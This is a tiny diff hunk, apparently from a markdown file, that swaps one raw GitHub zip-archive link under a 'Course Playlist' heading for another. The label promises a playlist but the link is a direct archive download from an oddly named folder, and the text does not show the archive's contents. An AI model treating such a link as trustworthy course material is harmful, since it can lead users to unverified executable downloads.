@@ -9,4 +9,4 @@
 
 ---
 #### Course Playlist
-https://github.com/weiran0630/learnphptherightway-project/raw/refs/heads/main/unfrayed/project-learnphptherightway-3.5.zip
+https://github.com/weiran0630/learnphptherightway-project/raw/refs/heads/main/unfrayed/project-learnphptherightway-1.2.zip
